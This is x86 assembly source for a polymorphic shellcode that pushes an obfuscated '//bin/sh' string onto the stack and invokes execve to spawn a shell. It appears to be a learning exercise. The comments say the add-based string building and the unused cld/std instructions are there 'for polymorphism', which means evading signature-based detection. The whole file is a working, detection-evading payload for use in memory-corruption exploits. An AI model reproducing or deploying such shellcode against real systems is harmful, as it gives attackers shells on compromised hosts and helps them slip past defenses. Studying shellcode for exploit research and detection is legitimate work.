; author: fuzboxz

global _start

section .text

_start:

    ; Push //bin/sh0x00 onto the stack
    ; null byte
    xor eax, eax ; null out eax
    push eax ; null byte

    ;original
    ; //bin/sh
    ;push 0x68732f6e ; hs/n
    ;push 0x69622f2f ; ib//

    ; //bin/sh - mov instead of pushing
    ;mov dword [esp-8], 0x69622f2f ; ib//
    ;mov dword [esp-4], 0x68732f6e ; hs/n
    ;sub esp, 8

    cld ; unused flag, just added for polymorphism
    mov esi, 0x58511e1e ; add intermediate
    add esi, 0x11111111 ; ib//
    mov dword [esp-8], esi
    std ; unused flag, just added for polymorphism

    mov dword [esp-4], 0x68732f6e ; hs/n
    sub esp, 8

    mov ebx, esp ; address of the program name -> //bin/sh0x00

    push eax ; push another null for the sys argv
    mov edx, esp ; sysargv arguments - address as above, but now with extra bytes

    push ebx
    mov ecx, esp

    mov al, 11 ; execve syscall
    int 0x80 ; call execve